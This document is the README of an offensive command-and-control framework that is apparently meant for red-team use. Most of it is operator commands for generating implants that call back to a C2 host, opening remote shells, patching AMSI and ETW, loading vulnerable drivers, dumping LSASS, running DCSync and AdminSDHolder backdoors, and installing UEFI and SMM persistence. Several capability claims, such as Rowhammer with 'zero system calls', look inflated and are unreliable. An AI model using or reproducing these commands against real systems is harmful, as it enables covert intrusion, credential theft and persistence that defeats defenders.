# SUDOSOC-C2

<div align="center">

```
███████╗██╗   ██╗██████╗  ██████╗ ███████╗ ██████╗  ██████╗     ██████╗██████╗
██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔════╝██╔═══██╗██╔════╝    ██╔════╝╚════██╗
███████╗██║   ██║██║  ██║██║   ██║███████╗██║   ██║██║         ██║      █████╔╝
╚════██║██║   ██║██║  ██║██║   ██║╚════██║██║   ██║██║         ██║     ██╔═══╝
███████║╚██████╔╝██████╔╝╚██████╔╝███████║╚██████╔╝╚██████╗    ╚██████╗███████╗
╚══════╝ ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝     ╚═════╝╚══════╝
```

**Precision adversary simulation. Zero compromise.**

![License](https://img.shields.io/badge/license-GPLv3-blue)
![Go](https://img.shields.io/badge/Go-1.25%2B-00ADD8)
![Version](https://img.shields.io/badge/version-v2.0.0-green)
![Author](https://img.shields.io/badge/author-Seif%20%40sudosoc-red)

</div>

---

## Overview

**SUDOSOC-C2** is an advanced, operator-grade Command & Control (C2) framework built for professional red team operations, APT adversary simulation, and offensive security research.

Built on a hardened Go core, SUDOSOC-C2 combines:

- **Phantom Engine** — polymorphic implants with deep EDR evasion
- **7 C2 Channels** — ensuring persistence in any network environment
- **Hardware-Level Persistence** — UEFI, SMM, Rowhammer, PCIe DMA
- **Full AD Attack Suite** — DCSync, Kerberoasting, DCShadow, and more
- **Intel VT-x Hypervisor** — full VMX engine embedded in the implant

---

## Table of Contents

1. [Requirements](#1-requirements)
2. [Build and Install](#2-build-and-install)
3. [First Run](#3-first-run)
4. [C2 Channels](#4-c2-channels)
5. [Phantom Implant Engine](#5-phantom-implant-engine)
6. [Privilege Escalation and Evasion](#6-privilege-escalation-and-evasion)
7. [Active Directory Attacks](#7-active-directory-attacks)
8. [Hardware-Level Persistence](#8-hardware-level-persistence)
9. [Hypervisor VMX Engine](#9-hypervisor-vmx-engine)
10. [Operational Security](#10-operational-security)
11. [Operator Console Reference](#11-operator-console-reference)
12. [Multiplayer](#12-multiplayer)
13. [Extensions and Armory](#13-extensions-and-armory)
14. [AI Integration](#14-ai-integration)
15. [Default Ports](#15-default-ports)
16. [Configuration Paths](#16-configuration-paths)
17. [Project Identity](#17-project-identity)
18. [License](#18-license)

---

## 1. Requirements

| Requirement | Minimum | Notes |
|-------------|---------|-------|
| **Go** | 1.25 | Required for building |
| **GCC / MinGW-w64** | Any recent | Cross-compiling to Windows |
| **make** | GNU Make | Linux/macOS only |
| **protoc** | 3.x | Only to regenerate protobufs |
| **RAM** | 32 GB+ | For full test suite |
| **CPU** | 16 cores+ | For full test suite |

---

## 2. Build and Install

### Linux / macOS

```bash
git clone https://github.com/sudosoc/SUDOSOC-C2.git
cd SUDOSOC-C2

# Server + client for current platform
make

# Cross-compile targets
make windows-amd64      # Windows 64-bit
make macos-arm64        # Apple Silicon
make linux-arm64        # Linux ARM64
make clients            # All client platforms
make servers            # All server platforms
```

### Windows (PowerShell)

```powershell
# Server
go build -mod=vendor -o sudosoc-server.exe ./server

# Client
go build -mod=vendor -o sudosoc-client.exe ./client
```

### Debug Build

```bash
make debug
```

---

## 3. First Run

### Step 1 — Start the Server

```bash
./sudosoc-server
# or as daemon:
./sudosoc-server daemon --lhost 0.0.0.0 --lport 47443
```

On first run, the server generates TLS certificates, WireGuard keys, and creates `~/.sudosoc/`.

### Step 2 — Create an Operator Profile

```bash
sudosoc > multiplayer
sudosoc [server] > new-operator --name seif --lhost <SERVER_IP>
# Output: seif_<SERVER_IP>.cfg
```

### Step 3 — Connect the Client

```bash
./sudosoc-client import seif_<SERVER_IP>.cfg
./sudosoc-client
```

Prompt appears:
```
sudosoc >
```

---

## 4. C2 Channels

### mTLS (Mutual TLS)

```bash
sudosoc > mtls --lhost 0.0.0.0 --lport 8888
sudosoc > generate --mtls <C2_IP>:8888 --os windows --arch amd64 --save /tmp/
```

Full TLS 1.3 with certificate pinning. Both sides authenticate. Best choice for internal networks.

---

### HTTP / HTTPS with Malleable Profiles

```bash
sudosoc > https --lhost 0.0.0.0 --lport 443
sudosoc > generate --https <C2_IP> --os linux --arch amd64

# Custom C2 profile (mimics Google Analytics, CDN, etc.)
sudosoc > c2profiles new --name "cdn-profile"
sudosoc > https --lhost 0.0.0.0 --lport 443 --profile cdn-profile
```

Profiles control: User-Agent, HTTP headers, URL patterns, staging.

---

### DNS / DNS-over-HTTPS

```bash
sudosoc > dns --domains c2.sudosoc.com
sudosoc > generate --dns c2.sudosoc.com --os windows

# DoH — bypasses DNS monitoring entirely
sudosoc > generate --dns c2.sudosoc.com --doh-url https://cloudflare-dns.com/dns-query
```

Works in environments blocking all TCP/UDP except port 53. DoH is indistinguishable from regular HTTPS.

---

### WireGuard

```bash
sudosoc > wg --lhost 0.0.0.0 --lport 51820
sudosoc > generate --wg <C2_IP>:51820 --os windows
```

---

### SMB Named Pipes

Internet-free lateral movement within the internal network. Ideal for air-gapped environments.

---

### Dead-Drop

C2 relayed through legitimate cloud storage (S3, Pastebin, etc.). All traffic appears as normal cloud service usage.

---

### Timing Channel

C2 hidden entirely in network timing side-channels. Zero visible data on the wire.

---

## 5. Phantom Implant Engine

### Generating Implants

```bash
# Windows EXE
sudosoc > generate --mtls <IP> --os windows --arch amd64

# Windows DLL
sudosoc > generate --mtls <IP> --os windows --format shared

# Windows Shellcode (for injection)
sudosoc > generate --mtls <IP> --os windows --format shellcode

# Linux ELF
sudosoc > generate --mtls <IP> --os linux --arch amd64

# macOS (Apple Silicon)
sudosoc > generate --mtls <IP> --os darwin --arch arm64

# Stripped, with custom process name
sudosoc > generate --mtls <IP> --os windows --name "svchost" --skip-symbols

# Beacon mode (checks in every N seconds)
sudosoc > generate beacon --mtls <IP> --seconds 60 --jitter 30

# Multi-channel failover
sudosoc > generate --mtls <IP1> --https <IP2> --dns domain.com

# Full evasion mode
sudosoc > generate --mtls <IP> --os windows --evasion
```

### Implant Profiles

```bash
# Save settings as reusable profile
sudosoc > profiles new --name "stealth-win64" --mtls <IP> --os windows --skip-symbols --evasion

# Generate from saved profile
sudosoc > profiles generate --profile stealth-win64

# List profiles
sudosoc > profiles
```

---

### Evasion — How Phantom Defeats EDR

#### Indirect Syscalls

Traditional implants trigger hooks in ntdll that EDRs monitor. Phantom reads the System Service Number (SSN) from the live ntdll in memory at runtime, then jumps to the real `syscall;ret` gadget inside ntdll itself. The kernel sees ntdll as the syscall origin — identical to a legitimate Windows API call. EDR call-stack inspection finds nothing suspicious.

#### AMSI Bypass

Patches `AmsiScanBuffer` in memory. PowerShell, .NET, and script execution become blind to payloads. No disk writes, no file scanner alerts.

#### ETW Bypass

Patches `NtTraceEvent` stub. Event Tracing for Windows is silenced — Process Monitor, Sysmon, and Windows Event Log lose visibility into the process entirely.

#### Sleep Obfuscation

During beacon sleep intervals: the implant's Heap and Stack are XOR-encrypted. Every YARA rule and memory scanner finds nothing. The implant effectively vanishes from memory between check-ins.

#### Stack Spoofing

Poisons the return-address chain with synthetic ntdll frames. Any EDR that validates the call stack on syscall entry sees a legitimate-looking thread — not implant code.

#### Argument Spoofing

Manipulates `STARTUPINFO` to hide true command-line arguments from process-creation telemetry, Sysmon Event ID 1, and Windows Event Log.

#### Phantom DLL Hollowing

Loads a legitimate, signed DLL into memory, then overwrites its `.text` section with shellcode. The module appears signed and legitimate in all process listing tools.

#### Compiler Backdoor

Optional supply-chain module that injects hidden `init.phantom_*` functions into compiled Go binaries at link time — indistinguishable from standard init functions.

---

## 6. Privilege Escalation and Evasion

### GetSystem

```bash
sudosoc (session) > getsystem
sudosoc (session) > getsystem --technique token-duplication
```

### BYOVD — Bring Your Own Vulnerable Driver

Loads a signed but exploitable kernel driver for Ring-0 code execution on fully-patched systems:

```bash
# Upload driver
sudosoc (session) > upload /path/to/RTCore64.sys C:\Windows\Temp\drv.sys
# Execute BYOVD
sudosoc (session) > byovd --driver-path C:\Windows\Temp\drv.sys --action full
# Or auto-upload
sudosoc (session) > byovd --local-driver /path/to/RTCore64.sys --action full
```

### PatchGuard Bypass

Disables Kernel Patch Protection (KPP) via DPC callbacks before the integrity check fires.

### DSE Bypass

```bash
sudosoc (session) > dse-bypass
```

Disables Driver Signature Enforcement — load any unsigned kernel module.

### PPL Bypass

Bypasses Protected Process Light to inject into `lsass.exe` and other protected processes. Enables direct credential theft from LSASS memory.

---

## 7. Active Directory Attacks

### DCSync

```bash
sudosoc (session) > dcsync --domain example.local --user Administrator
sudosoc (session) > dcsync --domain example.local --all
```

Replicates as a Domain Controller — the real DC provides all password hashes. No disk writes, no detectable file operations.

### Kerberoasting

```bash
sudosoc (session) > kerberoast
# Exports Hashcat-compatible hashes for offline cracking
```

### AS-REP Roasting

```bash
sudosoc (session) > asreproast
```

Targets accounts with Kerberos pre-authentication disabled.

### DCShadow

```bash
sudosoc (session) > dcshadow --domain example.local
```

Registers a rogue Domain Controller to inject arbitrary attributes into AD — no traceable event logs.

### AdminSDHolder Backdoor

```bash
sudosoc (session) > adminsdholder --domain example.local --user attacker_user
```

Backdoors the AdminSDHolder container — guarantees Domain Admin access every 60-minute propagation cycle.

---

## 8. Hardware-Level Persistence

### UEFI Implant

```bash
sudosoc (session) > uefi --install --efi-path /boot/efi
```

Writes a DXE driver to the EFI System Partition. Survives: OS reinstall, hard drive replacement, BitLocker, SecureBoot (with key enrollment).

### SMM Rootkit

```bash
sudosoc (session) > smm --install
```

Injects a handler into System Management Mode (Ring -2) — below the OS, below the hypervisor. Impossible to detect with any OS-level security tool. Survives everything except a firmware reflash.

### Rowhammer

```bash
sudosoc (session) > rowhammer --target-pid <PID>
```

Exploits DRAM bit-flip vulnerabilities for privilege escalation. Zero system calls, zero memory allocations, zero security log entries.

### PCI-DMA

```bash
sudosoc (session) > pcidma --read --phys-addr 0x1000000 --size 4096
```

Direct physical memory read/write via PCIe endpoints. Bypasses the OS, the hypervisor, and IOMMU in certain configurations.

---

## 9. Hypervisor VMX Engine

```bash
sudosoc (session) > vmx --install
```

Converts the target machine into a Type-1 Hypervisor using Intel VT-x:

| Feature | Description |
|---------|-------------|
| VMX Control | Implant becomes the hypervisor; target OS runs as a guest VM |
| EPT Manipulation | Hide memory regions from all OS-level security tools |
| VMCS Introspection | Monitor guest OS execution in real-time |
| VM-Exit Trapping | Intercept any syscall, interrupt, or hardware event |

---

## 10. Operational Security

### Zero-Knowledge Proofs

Operators prove identity to the server without transmitting credentials in plaintext. Intercepted traffic cannot be used to impersonate operators.

### Ring Signatures

Multiple operators sign commands collectively. No one can determine which specific operator signed any given command — ideal for high legal-exposure operations.

### Pedersen Commitments

Tasks are cryptographically committed before transmission. The server cannot tamper with task contents, and the operator can verify the implant executed exactly the intended task.

### TLS Certificate Randomization

Every generated implant receives a unique TLS certificate with a randomly generated organization name — no certificate fingerprinting is possible.

---

## 11. Operator Console Reference

### Prompt Structure

```
sudosoc >               Main menu
sudosoc (session) >     Inside an active implant session
sudosoc [server] >      Server admin mode
```

### Session Management

```bash
sudosoc > sessions                      # List all sessions
sudosoc > sessions -i <ID>              # Enter session
sudosoc > sessions -k <ID>              # Kill session
```

### Beacon Management

```bash
sudosoc > beacons                       # List all beacons
sudosoc > beacons -i <ID>               # Interact with beacon
sudosoc > beacons -k <ID>               # Kill beacon
```

### Inside a Session — Full Command Reference

```bash
# Remote Shell
sudosoc (session) > shell               # Interactive shell
sudosoc (session) > execute "cmd"       # Execute single command
sudosoc (session) > powershell          # PowerShell session

# Filesystem
sudosoc (session) > ls [path]
sudosoc (session) > cd <path>
sudosoc (session) > pwd
sudosoc (session) > cat <file>
sudosoc (session) > download <remote> <local>
sudosoc (session) > upload <local> <remote>
sudosoc (session) > mkdir <dir>
sudosoc (session) > rm <path>
sudosoc (session) > cp <src> <dst>
sudosoc (session) > mv <src> <dst>
sudosoc (session) > grep <pattern> <path>

# Process Management
sudosoc (session) > ps                  # List processes
sudosoc (session) > procdump --pid <PID>
sudosoc (session) > migrate --pid <PID>
sudosoc (session) > kill --pid <PID>

# Network
sudosoc (session) > ifconfig
sudosoc (session) > netstat
sudosoc (session) > portfwd add --remote <host>:<port> --local <port>
sudosoc (session) > portfwd rm --id <ID>
sudosoc (session) > socks5 start --port 1080
sudosoc (session) > socks5 stop

# Privileges
sudosoc (session) > whoami
sudosoc (session) > getprivs
sudosoc (session) > getsystem
sudosoc (session) > impersonate <username>
sudosoc (session) > steal-token --pid <PID>
sudosoc (session) > make-token <user> <pass>
sudosoc (session) > rev2self

# Pivoting
sudosoc (session) > pivots                          # List pivots
sudosoc (session) > pivots tcp --bind-port 9090     # TCP pivot listener

# Screenshot / Keylogger
sudosoc (session) > screenshot
sudosoc (session) > screenshot --loot

# Environment
sudosoc (session) > env
sudosoc (session) > setenv <KEY> <VALUE>
sudosoc (session) > unsetenv <KEY>

# .NET / Assembly
sudosoc (session) > execute-assembly <local.exe> [args]
sudosoc (session) > sideload <local.so> [args]
sudosoc (session) > spawndll <local.dll> [args]

# Shellcode
sudosoc (session) > execute-shellcode --pid <PID> <shellcode.bin>

# Loot
sudosoc (session) > loot                # View loot
```

### Credential Management

```bash
sudosoc > creds                         # View all credentials
sudosoc > creds add --user <u> --pass <p> --domain <d>
sudosoc > creds rm --id <ID>
```

---

## 12. Multiplayer

### Setup

```bash
# Open multiplayer listener
sudosoc [server] > multiplayer --lhost 0.0.0.0 --lport 47443

# Generate operator configs
sudosoc [server] > new-operator --name alice --lhost <IP>
sudosoc [server] > new-operator --name bob   --lhost <IP>
```

### Connect Operators

```bash
./sudosoc-client import alice_<IP>.cfg
./sudosoc-client
```

Multiple operators share the same sessions in real-time. Full audit log of all commands. Multiplayer optionally over WireGuard for additional security.

---

## 13. Extensions and Armory

### Armory

```bash
sudosoc > armory                        # Browse packages
sudosoc > armory install <name>         # Install extension
sudosoc > armory update                 # Update all
```

### BOF (Beacon Object Files)

```bash
sudosoc (session) > load-extension /path/to/extension.json
sudosoc (session) > <extension-command> [args]
```

### Aliases

```bash
sudosoc > aliases load /path/to/alias
sudosoc > aliases
```

---

## 14. AI Integration

```bash
sudosoc > ai
sudosoc (session) > ai          # With active session context
```

Configure at `~/.sudosoc/configs/ai.yaml`:

```yaml
providers:
  openai:
    api_key: "sk-..."
    model: "gpt-4o"
```

AI capabilities: technique suggestions, payload assistance, reconnaissance analysis, kill-chain recommendations, report generation.

---

## 15. Default Ports

| Service | Port | Protocol |
|---------|------|----------|
| mTLS C2 | 8888 | TCP |
| HTTP C2 | 80 | TCP |
| HTTPS C2 | 443 | TCP |
| DNS C2 | 53 | UDP |
| WireGuard C2 | 51820 | UDP |
| **Multiplayer** | **47443** | **TCP** |

---

## 16. Configuration Paths

### Linux / macOS

| Path | Purpose |
|------|---------|
| `~/.sudosoc/` | Root directory |
| `~/.sudosoc/configs/` | Configuration files |
| `~/.sudosoc/certs/` | TLS certificates and keys |
| `~/.sudosoc/logs/sudosoc-c2.log` | Log file |
| `~/.sudosoc/builds/` | Generated implants |
| `~/.sudosoc/loot/` | Collected loot |
| `/etc/sudosoc-C2/` | Server config (daemon mode) |

### Windows

| Path | Purpose |
|------|---------|
| `%APPDATA%\sudosoc\` | Root directory |
| `%APPDATA%\sudosoc\configs\` | Configuration files |
| `%APPDATA%\sudosoc\logs\sudosoc-c2.log` | Log file |

---

## 17. Project Identity

| Field | Value |
|-------|-------|
| Project Name | SUDOSOC-C2 |
| Short Name | sudosoc |
| Author | Seif (@sudosoc) |
| Version | v2.0.0 |
| Copyright Year | 2026 |
| Go Module | `github.com/sudosoc/SUDOSOC-C2` |
| Repository | https://github.com/sudosoc/SUDOSOC-C2.git |
| Server Binary | `sudosoc-server` |
| Client Binary | `sudosoc-client` |
| Implant Codename | phantom |
| TLS Cert Org | Meridian Cloud Services, Inc. |
| gRPC Service | SudosocAPI |
| Multiplayer Port | 47443 |
| User Config Dir | `~/.sudosoc/` |
| Server Config Dir | `/etc/sudosoc-C2/` |
| Log File | `sudosoc-c2.log` |
| Default Operator | sudosoc |
| Default C2 Domain | sudosoc.com |

---

## 18. License

```
SUDOSOC-C2 — Precision adversary simulation. Zero compromise.
Copyright (C) 2026  Seif (@sudosoc)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
```

See [LICENSE](./LICENSE) for the full text.

---

> **SUDOSOC-C2 — Precision adversary simulation. Zero compromise.**
